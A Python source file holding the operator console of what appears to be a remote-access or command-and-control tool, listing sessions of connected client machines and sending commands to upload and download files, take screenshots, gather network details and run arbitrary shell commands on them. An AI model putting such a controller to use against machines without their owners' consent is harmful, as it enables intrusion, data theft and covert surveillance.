from colorama import init, Fore, Back, Style
from Server import Server
import os
import sys
import socket
import signal
from modules import *

def def_handler(sig, frame):
    print(Fore.RED + "\n\nExiting...\n" + Style.RESET_ALL)
    sys.exit(1)
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class CommandLineInterface:
    """A class representing a command-line interface that handles the user input.

    Attributes:
        currentSession (int): Number of the current session the user is managing.
        commandHistory (String[]): Historic of all the commands ran by the user.
    """

    def __init__(self, currentSession=None):
        self._currentSession = currentSession

    def start(self):
        """Starts the command-line interface logic"""
        self.server = Server.getInstance()
        self.server.start()
        self.commandHandler()
        init() # Colorama

    def sessionHandler(self):
        """Handles the pseudo-terminal once a valid session is chosen"""
        user = os.getlogin().lower()

        prompt = prompt = f"{user}@lons-" + Fore.RED + f"session{self._currentSession}" + Style.RESET_ALL + "> "
        print("Type help to see options")

        while self._currentSession is not None:
            # Print the prompt and read user input
            user_input = input(prompt)

            if user_input == '':
                pass
            if user_input == 'help':
                print("Available commands:")
                print(Fore.RED + "\n\t\t upload_file <local_file_path> <remote_file_path> " + Style.RESET_ALL + "- Uploads the file given in the current local machine to the remote file path specified.")
                print(Fore.RED + "\n\t\t download_file <remote_file_path> <local_file_path>" + Style.RESET_ALL + "- Downloads the file remote file path specified and saves it in the local file path given.")
                print(Fore.RED + "\n\t\t screenshot <local_image_path>" + Style.RESET_ALL + "- Takes a screenshot in the client machine, and saves the image in the local path specified.")
                print(Fore.RED + "\n\t\t netinfo " + Style.RESET_ALL + "- Displays the most relevant net information, such as open ports and network interfaces.")
                print(Fore.RED + "\n\t\t run <command>" + Style.RESET_ALL + "- Runs the given command in the client and displays the information.")
                print(Fore.RED + "\n\t\t back " + Style.RESET_ALL + "- Exit current session")
                print("")

            if user_input.startswith('upload_file'):
                args = user_input.split()[1:]
                local_file = args[0]
                remote_file = args[1]
                connection = self.server.getConnection(self._currentSession - 1)

                mod = UploadFile(connection, local_file, remote_file)
                stdout = mod.execute()

                print(stdout)

            if user_input.startswith('download_file'):
                args = user_input.split()[1:]

                remote_file = args[0]
                local_file = args[1]
                connection = self.server.getConnection(self._currentSession - 1)

                mod = DownloadFile(connection, remote_file, local_file)
                stdout = mod.execute()

                print(stdout)


            if user_input.startswith('screenshot'):
                args = user_input.split()[1:]

                local_path = args[0]
                connection = self.server.getConnection(self._currentSession - 1)

                mod = Screenshot(connection, local_path)
                stdout = mod.execute()

                print(stdout)

            if user_input == 'netinfo':
                connection = self.server.getConnection(self._currentSession - 1)
                client_os = self.server.getClient(self._currentSession - 1).getClientInfo()[4]


                mod = NetInfo(connection, client_os)
                stdout = mod.execute()

                print(stdout)

            if user_input.startswith('run'):
                args = user_input.split()[1:]

                connection = self.server.getConnection(self._currentSession - 1)
                command = ' '.join(args)

                stdout = Run(connection, command).execute()

                print(stdout)

            if user_input == 'back':
                self._currentSession = None

    def commandHandler(self):
        """Creates a pseudo-console, and handles input entered by the user"""

        user = os.getlogin().lower()

        prompt = f"{user}@lons> "
        print("Type help to see options")

        while True:
            # Print the prompt and read user input
            if self._currentSession == None:
                prompt = f"{user}@lons> "
            else:
                prompt = f"{user}@lons-" + Fore.RED + f"session{self._currentSession}" + Style.RESET_ALL + "> "
            user_input = input(prompt)

            if user_input == '':
                pass
            if user_input == 'help':
                print("Available commands:")
                print(Fore.RED + "\n\t\t sessions " + Style.RESET_ALL + "- Display active sessions and choose one")
                print(Fore.RED + "\n\t\t delete " + Style.RESET_ALL + "- Display active sessions and delete one")
                print(Fore.RED + "\n\t\t exit " + Style.RESET_ALL + "- Stop server and threads, and exit the program")
                print("")

            if user_input == 'sessions':
                valid_session = False
                clients = self.server.getClients()
                if clients:
                    while not valid_session:
                        for i,c in enumerate(clients):
                            print(Fore.RED + "\t\t{}".format(i+1) + Style.RESET_ALL + " - {}:{} - OS: {}".format(c[2],c[3],c[4]))

                        print(Fore.RED + "\t\tback" + Style.RESET_ALL + " - Go back without choosing a session")
                        sess = input("session nº> ")
                        if sess == 'back':
                            valid_session = True
                        elif sess == '':
                            pass
                        else :
                            if int(sess) >= 1 and int(sess) <= len(clients):
                                valid_session = True
                                self._currentSession = int(sess)
                                self.sessionHandler()
                else:
                    print("No clients connected!")

            if user_input == 'delete':
                valid_session = False
                clients = self.server.getClients()
                if clients:
                    while not valid_session:
                        for i, c in enumerate(clients):
                            print(Fore.RED + "\t\t{}".format(i+1) + Style.RESET_ALL + " - {}:{} - OS: {}".format(c[2],c[3],c[4]))

                        print(Fore.RED + "\t\tback" + Style.RESET_ALL + " - Go back without choosing a session")
                        sess = input("session nº> ")
                        if sess == 'back':
                            valid_session = True
                        else:
                            if int(sess) >= 1 and int(sess) <= len(clients):
                                valid_session = True
                                self.server.deleteClient(int(sess))
                else:
                    print("No clients connected!")

            if user_input == 'exit':
                self.server.stop()
                sys.exit(1)